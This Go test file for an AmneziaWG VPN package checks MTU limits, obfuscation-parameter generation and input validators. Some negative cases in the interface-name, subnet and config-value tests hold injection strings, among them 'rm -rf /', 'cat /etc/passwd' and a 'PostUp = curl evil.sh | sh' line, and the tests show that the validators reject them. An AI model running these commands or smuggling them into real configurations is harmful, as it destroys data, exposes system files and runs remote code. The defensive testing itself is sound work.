package amneziawg

import (
	"encoding/base64"
	"strconv"
	"strings"
	"testing"
)

func TestEffectiveMTUUsesExplicitValueVerbatimEvenIfItOverflows(t *testing.T) {
	// EffectiveMTU never second-guesses an explicit admin choice -- that's
	// ValidateMTUBudget's job, checked separately at save time.
	if got := EffectiveMTU(1428, 22, 1420); got != 1428 {
		t.Fatalf("EffectiveMTU(1428, 22, 1420) = %d, want 1428", got)
	}
}

func TestEffectiveMTUShrinksUnsetDefaultToFitS4(t *testing.T) {
	// fallbackDefault (1420) + S4 (22) = 1442 > mtuPathCeiling (1440), so the
	// unset case must shrink to 1440-22=1418, not silently overflow.
	if got := EffectiveMTU(0, 22, 1420); got != 1418 {
		t.Fatalf("EffectiveMTU(0, 22, 1420) = %d, want 1418", got)
	}
}

func TestEffectiveMTULeavesUnsetDefaultAloneWhenItAlreadyFits(t *testing.T) {
	if got := EffectiveMTU(0, 4, 1420); got != 1420 {
		t.Fatalf("EffectiveMTU(0, 4, 1420) = %d, want 1420 unchanged", got)
	}
}

func TestValidateMTUBudgetAllowsUnsetMTURegardlessOfS4(t *testing.T) {
	if err := ValidateMTUBudget(0, 32); err != nil {
		t.Fatalf("mtu <= 0 must never be rejected, even with S4 at its max: %v", err)
	}
}

func TestValidateMTUBudgetRejectsOverflow(t *testing.T) {
	err := ValidateMTUBudget(1428, 22)
	if err == nil {
		t.Fatal("expected an error: 1428+22=1450 > 1440")
	}
	if !strings.Contains(err.Error(), "1418") {
		t.Fatalf("error %q does not name the actual ceiling (1440-22=1418)", err.Error())
	}
}

func TestValidateMTUBudgetAcceptsExactCeiling(t *testing.T) {
	if err := ValidateMTUBudget(1418, 22); err != nil {
		t.Fatalf("1418+22=1440 is exactly at the ceiling, must be accepted: %v", err)
	}
}

func TestGenerateObfuscation20DefaultRanges(t *testing.T) {
	for i := 0; i < 200; i++ {
		o := GenerateObfuscation20("default")
		if o.Jc < 3 || o.Jc > 6 {
			t.Fatalf("Jc = %d, want [3,6]", o.Jc)
		}
		if o.Jmin < 40 || o.Jmin > 89 {
			t.Fatalf("Jmin = %d, want [40,89]", o.Jmin)
		}
		if o.Jmax < o.Jmin+50 || o.Jmax > o.Jmin+250 {
			t.Fatalf("Jmax = %d, want [Jmin+50, Jmin+250] (Jmin=%d)", o.Jmax, o.Jmin)
		}
		if o.S1 < 15 || o.S1 > 150 {
			t.Fatalf("S1 = %d, want [15,150]", o.S1)
		}
		if o.S2 < 15 || o.S2 > 150 {
			t.Fatalf("S2 = %d, want [15,150]", o.S2)
		}
		if o.S1+56 == o.S2 {
			t.Fatalf("S1+56 == S2 (%d+56 == %d): violates kernel constraint", o.S1, o.S2)
		}
		// Floored at 12, not S1/S2's 15: HeaderProtectionKey is always
		// generated below, and ValidateHeaderProtection needs S1-S4 >= 12.
		if o.S3 < 12 || o.S3 > 55 {
			t.Fatalf("S3 = %d, want [12,55]", o.S3)
		}
		if o.S4 < 12 || o.S4 > 27 {
			t.Fatalf("S4 = %d, want [12,27]", o.S4)
		}
		for name, h := range map[string]string{"H1": o.H1, "H2": o.H2, "H3": o.H3, "H4": o.H4} {
			if err := validateHValue(h); err != nil {
				t.Fatalf("%s = %q invalid: %v", name, h, err)
			}
			if h == "" {
				t.Fatalf("%s is empty, want a generated range", name)
			}
		}
		for name, i := range map[string]string{"I1": o.I1, "I2": o.I2, "I3": o.I3, "I4": o.I4, "I5": o.I5} {
			if !strings.HasPrefix(i, "<r ") || !strings.HasSuffix(i, ">") {
				t.Fatalf("%s = %q, want \"<r N>\" form", name, i)
			}
			n, err := strconv.Atoi(strings.TrimSuffix(strings.TrimPrefix(i, "<r "), ">"))
			if err != nil || n < 32 || n > 256 {
				t.Fatalf("%s = %q, embedded N must be an integer in [32,256]", name, i)
			}
		}

		key, err := base64.StdEncoding.DecodeString(o.HeaderProtectionKey)
		if err != nil || len(key) != 32 {
			t.Fatalf("HeaderProtectionKey = %q, want base64 of 32 bytes (err=%v)", o.HeaderProtectionKey, err)
		}
		parseRange := func(t *testing.T, name, v string) (lo, hi int) {
			t.Helper()
			loS, hiS, ok := strings.Cut(v, "-")
			lo, loErr := strconv.Atoi(loS)
			hi, hiErr := strconv.Atoi(hiS)
			if !ok || loErr != nil || hiErr != nil || lo >= hi {
				t.Fatalf("%s = %q, want a \"low-high\" range with low < high", name, v)
			}
			return lo, hi
		}
		for name, v := range map[string]string{
			"ContentPaddingAddition": o.ContentPaddingAddition,
			"RekeyAfterTime":         o.RekeyAfterTime,
			"RejectAfterTime":        o.RejectAfterTime,
			"RekeyTimeout":           o.RekeyTimeout,
			"KeepaliveTimeout":       o.KeepaliveTimeout,
			"MaxHandshakeAttempts":   o.MaxHandshakeAttempts,
		} {
			parseRange(t, name, v)
		}
		_, rekeyHi := parseRange(t, "RekeyAfterTime", o.RekeyAfterTime)
		rejectLo, _ := parseRange(t, "RejectAfterTime", o.RejectAfterTime)
		if rejectLo <= rekeyHi {
			t.Fatalf("RejectAfterTime low (%d) must exceed RekeyAfterTime high (%d) by construction", rejectLo, rekeyHi)
		}
		if !o.RandomTrailers || !o.DisableCookies {
			t.Fatalf("fresh defaults must enable RandomTrailers/DisableCookies, got %v/%v", o.RandomTrailers, o.DisableCookies)
		}
	}
}

func TestGenerateObfuscation20MobilePreset(t *testing.T) {
	for i := 0; i < 100; i++ {
		o := GenerateObfuscation20("mobile")
		if o.Jc != 3 {
			t.Fatalf("mobile preset: Jc = %d, want 3", o.Jc)
		}
		if o.Jmin < 30 || o.Jmin > 50 {
			t.Fatalf("mobile preset: Jmin = %d, want [30,50]", o.Jmin)
		}
		if o.Jmax < o.Jmin+20 || o.Jmax > o.Jmin+80 {
			t.Fatalf("mobile preset: Jmax = %d, want [Jmin+20, Jmin+80] (Jmin=%d)", o.Jmax, o.Jmin)
		}
	}
}

func TestGenerateHValuesDistinct(t *testing.T) {
	for i := 0; i < 50; i++ {
		h := generateHValues()
		var prev int64
		for i, v := range h {
			n, err := strconv.ParseInt(v, 10, 64)
			if err != nil {
				t.Fatalf("H%d = %q is not a plain integer: %v", i+1, v, err)
			}
			if n <= prev {
				t.Fatalf("H%d = %q is not strictly greater than the previous value (%d)", i+1, v, prev)
			}
			prev = n
		}
	}
}

func validObfuscation() Obfuscation20 {
	return GenerateObfuscation20("default")
}

func TestValidateObfuscationAcceptsGenerated(t *testing.T) {
	for range 50 {
		if err := ValidateObfuscation(validObfuscation()); err != nil {
			t.Fatalf("generated obfuscation set rejected: %v", err)
		}
	}
}

func TestValidateObfuscationAcceptsBlankH(t *testing.T) {
	o := validObfuscation()
	o.H1, o.H2, o.H3, o.H4 = "", "", "", ""
	if err := ValidateObfuscation(o); err != nil {
		t.Fatalf("blank H values should be allowed (fall back to defaults): %v", err)
	}
}

func TestValidateObfuscationRejectsBadJminJmax(t *testing.T) {
	o := validObfuscation()
	o.Jmin, o.Jmax = 50, 10
	if err := ValidateObfuscation(o); err == nil {
		t.Fatal("Jmin > Jmax must be rejected")
	}
}

func TestValidateObfuscationRejectsBadS3S4(t *testing.T) {
	o := validObfuscation()
	o.S3 = 65
	if err := ValidateObfuscation(o); err == nil {
		t.Fatal("S3 > 64 must be rejected")
	}
	o = validObfuscation()
	o.S4 = 33
	if err := ValidateObfuscation(o); err == nil {
		t.Fatal("S4 > 32 must be rejected")
	}
	o = validObfuscation()
	o.S3, o.S4 = -1, -1
	if err := ValidateObfuscation(o); err == nil {
		t.Fatal("negative S3/S4 must be rejected")
	}
}

func TestValidateObfuscationRejectsS1S2Collision(t *testing.T) {
	o := validObfuscation()
	o.S1 = 30
	o.S2 = o.S1 + 56
	if err := ValidateObfuscation(o); err == nil {
		t.Fatal("S1+56 == S2 must be rejected (kernel constraint)")
	}
}

func TestValidateObfuscationRejectsBadH(t *testing.T) {
	cases := []string{"not-a-number", "10-", "-10", "5-4", "-1-10"}
	for _, h := range cases {
		o := validObfuscation()
		o.H1 = h
		if err := ValidateObfuscation(o); err == nil {
			t.Fatalf("H1 = %q must be rejected", h)
		}
	}
}

func TestValidateHeaderProtectionAllowsEmptyKeyRegardlessOfS1S4(t *testing.T) {
	o := Obfuscation20{S1: 0, S2: 0, S3: 0, S4: 0}
	if err := ValidateHeaderProtection("", o); err != nil {
		t.Fatalf("an empty key must never be rejected, even with S1-S4 all 0: %v", err)
	}
}

func TestValidateHeaderProtectionRequiresS1ThroughS4AtLeast12(t *testing.T) {
	base := Obfuscation20{S1: 20, S2: 20, S3: 20, S4: 20}
	cases := []struct {
		name    string
		mutate  func(*Obfuscation20)
		wantNum int
	}{
		{"S1 too low", func(o *Obfuscation20) { o.S1 = 11 }, 1},
		{"S2 too low", func(o *Obfuscation20) { o.S2 = 11 }, 2},
		{"S3 too low", func(o *Obfuscation20) { o.S3 = 11 }, 3},
		{"S4 too low", func(o *Obfuscation20) { o.S4 = 0 }, 4},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			o := base
			c.mutate(&o)
			err := ValidateHeaderProtection("some-key", o)
			if err == nil {
				t.Fatalf("expected an error for %s", c.name)
			}
			want := "S" + strconv.Itoa(c.wantNum)
			if !strings.Contains(err.Error(), want) {
				t.Fatalf("error %q does not name the offending field %q", err.Error(), want)
			}
		})
	}
}

func TestValidateHeaderProtectionAcceptsExactly12(t *testing.T) {
	o := Obfuscation20{S1: 12, S2: 12, S3: 12, S4: 12}
	if err := ValidateHeaderProtection("some-key", o); err != nil {
		t.Fatalf("S1-S4 all exactly 12 must be accepted: %v", err)
	}
}

func TestValidateContentPaddingAdditionAcceptsSameGrammarAsH(t *testing.T) {
	for _, v := range []string{"", "0", "65535", "50-100", "0-65535"} {
		if err := ValidateContentPaddingAddition(v); err != nil {
			t.Errorf("ValidateContentPaddingAddition(%q) rejected a valid value: %v", v, err)
		}
	}
}

func TestValidateContentPaddingAdditionRejectsBadValues(t *testing.T) {
	cases := []string{"not-a-number", "10-", "-10", "100-50", "65536", "0-65536", "-1"}
	for _, v := range cases {
		if err := ValidateContentPaddingAddition(v); err == nil {
			t.Errorf("ValidateContentPaddingAddition(%q) must be rejected", v)
		}
	}
}

func TestEffectiveAwgVersionPromotesLegacyRecordsWithAnAwg3FieldSet(t *testing.T) {
	cases := []struct {
		name                   string
		headerProtectionKey    string
		contentPaddingAddition string
	}{
		{"headerProtectionKey only", "some-key", ""},
		{"contentPaddingAddition only", "", "50-100"},
		{"both set", "some-key", "50-100"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got := EffectiveAwgVersion("", c.headerProtectionKey, c.contentPaddingAddition)
			if got != AwgVersion3 {
				t.Fatalf("EffectiveAwgVersion(%q, %q, %q) = %q, want %q", "", c.headerProtectionKey, c.contentPaddingAddition, got, AwgVersion3)
			}
		})
	}
}

func TestEffectiveAwgVersionLeavesABlankRecordWithNoAwg3FieldsAlone(t *testing.T) {
	got := EffectiveAwgVersion("", "", "")
	if got != "" {
		t.Fatalf("EffectiveAwgVersion(\"\", \"\", \"\") = %q, want empty (a brand new record needs no promotion)", got)
	}
}

func TestEffectiveAwgVersionNeverOverridesAnExplicitValue(t *testing.T) {
	cases := []struct {
		awgVersion             string
		headerProtectionKey    string
		contentPaddingAddition string
	}{
		{AwgVersion2, "some-key", ""},
		{AwgVersion2, "", "50-100"},
		{AwgVersion3, "", ""},
	}
	for _, c := range cases {
		got := EffectiveAwgVersion(c.awgVersion, c.headerProtectionKey, c.contentPaddingAddition)
		if got != c.awgVersion {
			t.Errorf("EffectiveAwgVersion(%q, %q, %q) = %q, want unchanged %q", c.awgVersion, c.headerProtectionKey, c.contentPaddingAddition, got, c.awgVersion)
		}
	}
}

func TestValidateAwgVersionAcceptsVersion3RegardlessOfFields(t *testing.T) {
	if err := ValidateAwgVersion(AwgVersion3, "some-key", "50-100"); err != nil {
		t.Fatalf("awgVersion 3 with both AWG3 fields set must be accepted: %v", err)
	}
	if err := ValidateAwgVersion(AwgVersion3, "", ""); err != nil {
		t.Fatalf("awgVersion 3 with neither field set must be accepted: %v", err)
	}
}

func TestValidateAwgVersionAcceptsVersion2WithNoAwg3Fields(t *testing.T) {
	if err := ValidateAwgVersion(AwgVersion2, "", ""); err != nil {
		t.Fatalf("awgVersion 2 with no AWG3 fields set must be accepted: %v", err)
	}
	if err := ValidateAwgVersion("", "", ""); err != nil {
		t.Fatalf("a blank awgVersion with no AWG3 fields set must be accepted: %v", err)
	}
}

func TestValidateAwgVersionRejectsAwg3FieldsBelowVersion3(t *testing.T) {
	cases := []struct {
		name                   string
		awgVersion             string
		headerProtectionKey    string
		contentPaddingAddition string
	}{
		{"version 2 with headerProtectionKey", AwgVersion2, "some-key", ""},
		{"version 2 with contentPaddingAddition", AwgVersion2, "", "50-100"},
		{"blank version with headerProtectionKey", "", "some-key", ""},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			err := ValidateAwgVersion(c.awgVersion, c.headerProtectionKey, c.contentPaddingAddition)
			if err == nil {
				t.Fatalf("expected an error for %s", c.name)
			}
		})
	}
}

func TestValidateAwgTimerValueAcceptsSameGrammarAsH(t *testing.T) {
	for _, v := range []string{"", "0", "4294967295", "118-135", "0-4294967295"} {
		if err := ValidateAwgTimerValue("rekeyAfterTime", v); err != nil {
			t.Errorf("ValidateAwgTimerValue(%q) rejected a valid value: %v", v, err)
		}
	}
}

func TestValidateAwgTimerValueRejectsBadValues(t *testing.T) {
	cases := []string{"not-a-number", "10-", "-10", "100-50", "4294967296", "0-4294967296", "-1"}
	for _, v := range cases {
		if err := ValidateAwgTimerValue("rekeyAfterTime", v); err == nil {
			t.Errorf("ValidateAwgTimerValue(%q) must be rejected", v)
		}
	}
}

func TestValidateAwgTimerValueNamesTheFieldInTheError(t *testing.T) {
	err := ValidateAwgTimerValue("maxHandshakeAttempts", "not-a-number")
	if err == nil {
		t.Fatal("expected an error")
	}
	if !strings.Contains(err.Error(), "maxHandshakeAttempts") {
		t.Fatalf("error %q does not name the field", err.Error())
	}
}

// The 5 AWG3 timer fields go through the same awgVersion gate as
// HeaderProtectionKey/ContentPaddingAddition -- amneziawgnet's UAPI
// builder emits all of them unconditionally whenever they're non-empty,
// regardless of what the admin declared as the version ceiling, so a
// mismatch here would be just as silently invisible as it would be for
// HeaderProtectionKey.
func TestEffectiveAwgVersionPromotesLegacyRecordsWithATimerFieldSet(t *testing.T) {
	got := EffectiveAwgVersion("", "", "", "118-135", "", "", "", "")
	if got != AwgVersion3 {
		t.Fatalf("EffectiveAwgVersion with only rekeyAfterTime set = %q, want %q", got, AwgVersion3)
	}
}

func TestValidateAwgVersionRejectsATimerFieldBelowVersion3(t *testing.T) {
	err := ValidateAwgVersion(AwgVersion2, "", "", "", "", "175-190", "", "")
	if err == nil {
		t.Fatal("expected an error for a timer field set alongside awgVersion 2")
	}
}

func TestValidateAwgVersionAcceptsVersion3WithTimerFieldsSet(t *testing.T) {
	err := ValidateAwgVersion(AwgVersion3, "", "", "118-135", "4-8", "175-190", "9-17", "15-22")
	if err != nil {
		t.Fatalf("awgVersion 3 with timer fields set must be accepted: %v", err)
	}
}

func TestValidateInterfaceNameAcceptsBlankAndPlausibleNames(t *testing.T) {
	for _, name := range []string{"", "eth0", "wg0", "br-lan", "eno1.100", "veth1a2b3c", "eth0:0"} {
		if err := ValidateInterfaceName(name); err != nil {
			t.Errorf("ValidateInterfaceName(%q) rejected a plausible name: %v", name, err)
		}
	}
}

func TestValidateInterfaceNameRejectsShellMetacharactersAndOverlength(t *testing.T) {
	cases := []string{
		"eth0 -j ACCEPT; rm -rf /",
		"eth0`whoami`",
		"eth0$(id)",
		"eth0|cat /etc/passwd",
		"eth0\nMASQUERADE",
		"aaaaaaaaaaaaaaaaaaaa", // 20 chars, over IFNAMSIZ-1
	}
	for _, name := range cases {
		if err := ValidateInterfaceName(name); err == nil {
			t.Errorf("ValidateInterfaceName(%q) must be rejected", name)
		}
	}
}

func TestValidateSubnetIPv4AcceptsValidBases(t *testing.T) {
	cases := []struct {
		ip   string
		cidr int
	}{
		{"10.8.1.0", 24},
		{"10.8.1.0", 0}, // cidr <= 0 defaults to /24, mirroring serverAddress
		{"192.168.5.10", 32},
	}
	for _, c := range cases {
		if err := ValidateSubnetIPv4(c.ip, c.cidr); err != nil {
			t.Errorf("ValidateSubnetIPv4(%q, %d) rejected a valid subnet: %v", c.ip, c.cidr, err)
		}
	}
}

func TestValidateSubnetIPv4RejectsMalformedOrInjectedValues(t *testing.T) {
	cases := []struct {
		ip   string
		cidr int
	}{
		{"10.8.1.0 -j ACCEPT; rm -rf /", 24}, // shell injection attempt
		{"not-an-ip", 24},
		{"", 24},
		{"fd86::1", 64},  // IPv6, not IPv4
		{"10.8.1.0", 33}, // cidr out of range
	}
	for _, c := range cases {
		if err := ValidateSubnetIPv4(c.ip, c.cidr); err == nil {
			t.Errorf("ValidateSubnetIPv4(%q, %d) must be rejected", c.ip, c.cidr)
		}
	}
}

func TestValidateConfigValueAcceptsPlausibleValues(t *testing.T) {
	for _, v := range []string{"", "user@example.com", "MCPfRGcDGotJ6TcnIdDqsemj2cMIiGHnPUHM5ivXN18=", "<r 148>"} {
		if err := ValidateConfigValue("email", v); err != nil {
			t.Errorf("ValidateConfigValue(%q) rejected a plausible value: %v", v, err)
		}
	}
}

func TestValidateConfigValueRejectsControlCharacters(t *testing.T) {
	cases := []string{
		"a@x\nPostUp = curl evil.sh | sh",
		"a@x\r\n[Interface]",
		"tab\there",
		"a@x\x7f",
	}
	for _, v := range cases {
		if err := ValidateConfigValue("email", v); err == nil {
			t.Errorf("ValidateConfigValue(%q) must be rejected", v)
		}
	}
}

// The plain 1420 default left no headroom for s4: it put full-size packets at
// 1480+S4 on the wire and fragmented every one of them once S4 passed 20.
func TestEffectiveMTUKeepsFullSizePacketsUnfragmented(t *testing.T) {
	t.Parallel()

	// 20 IPv4 + 8 UDP + 16 transport header + 16 poly1305 tag.
	const encapOverhead = 60
	const hostLinkMTU = 1500

	for s4 := 0; s4 <= 32; s4++ {
		mtu := EffectiveMTU(0, s4, 1420)
		if wire := mtu + encapOverhead + s4; wire > hostLinkMTU {
			t.Errorf("s4=%d: MTU %d puts a full-size transport packet at %d bytes on the wire, over the %d-byte host link", s4, mtu, wire, hostLinkMTU)
		}
	}
}

// TestValidateObfuscationRejectsOutOfRangeJunkAndPadding pins the widths
// amneziawg-go's UAPI actually parses: uint32 for jc/jmin/jmax, uint16 for s1-s4.
func TestValidateObfuscationRejectsOutOfRangeJunkAndPadding(t *testing.T) {
	base := Obfuscation20{Jc: 4, Jmin: 40, Jmax: 70, S1: 20, S2: 30, S3: 20, S4: 20}
	tests := []struct {
		name string
		mut  func(*Obfuscation20)
	}{
		{"S1 over uint16", func(o *Obfuscation20) { o.S1 = 65536 }},
		{"S2 over uint16", func(o *Obfuscation20) { o.S2 = 70000 }},
		{"negative Jc", func(o *Obfuscation20) { o.Jc = -1 }},
		{"negative Jmin and Jmax", func(o *Obfuscation20) { o.Jmin, o.Jmax = -5, -1 }},
		{"Jc over uint32", func(o *Obfuscation20) { o.Jc = 5000000000 }},
		{"negative S1", func(o *Obfuscation20) { o.S1 = -1 }},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			o := base
			tt.mut(&o)
			if err := ValidateObfuscation(o); err == nil {
				t.Fatal("ValidateObfuscation accepted a value amneziawg-go's UAPI parser rejects, so the inbound would save and then fail to apply")
			}
		})
	}
	if err := ValidateObfuscation(Obfuscation20{Jc: 4, Jmin: 40, Jmax: 70, S1: 65535, S2: 30, S3: 20, S4: 20}); err != nil {
		t.Fatalf("S1 at the uint16 maximum must stay valid: %v", err)
	}
}

// TestValidateObfuscationRejectsMalformedSignaturePackets covers I1-I5, whose
// "<tag value>" chain amneziawg-go parses with newObfChain (device/obf.go).
func TestValidateObfuscationRejectsMalformedSignaturePackets(t *testing.T) {
	base := Obfuscation20{Jc: 4, Jmin: 40, Jmax: 70, S1: 20, S2: 30, S3: 20, S4: 20}

	bad := []string{"<rand 100>", "<r 100", "<>", "<  >", "<r 10><nope 2>"}
	for _, spec := range bad {
		t.Run("reject "+spec, func(t *testing.T) {
			o := base
			o.I1 = spec
			if err := ValidateObfuscation(o); err == nil {
				t.Fatalf("ValidateObfuscation accepted I1=%q, which newObfChain rejects", spec)
			}
		})
	}

	good := []string{"", "<r 100>", "<b ff00><r 10>", "<t><rc 5>", "no tags at all"}
	for _, spec := range good {
		t.Run("accept "+spec, func(t *testing.T) {
			o := base
			o.I5 = spec
			if err := ValidateObfuscation(o); err != nil {
				t.Fatalf("ValidateObfuscation rejected valid I5=%q: %v", spec, err)
			}
		})
	}
}
